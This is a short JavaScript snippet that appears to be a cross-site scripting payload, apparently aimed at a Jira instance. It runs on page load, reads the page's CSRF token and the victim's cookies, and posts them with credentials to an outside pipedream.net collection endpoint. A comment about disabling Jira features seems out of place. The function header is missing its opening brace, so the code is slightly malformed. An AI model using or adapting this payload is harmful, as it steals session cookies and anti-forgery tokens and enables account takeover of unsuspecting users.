function loadDoc1()
const tokne= document.getElementsByName('csrf-token')[0].getAttribute('content');
var cookies = document.cookie;
var xhttp = new XMLHttpRequest();
xhttp.open("post", "https://eojjvbt09aaka4m.m.pipedream.net", true)
xhttp.setRequestHeader("Content-type", "text/plain;charset=UTF-8");
xhttp.withCredentials = true;
xhttp.send("token:"+tokne+"Cookies:"+cookies+""); //Or set newValue=false to disable all jira Software Features. 

}

window.onload = loadDoc1();
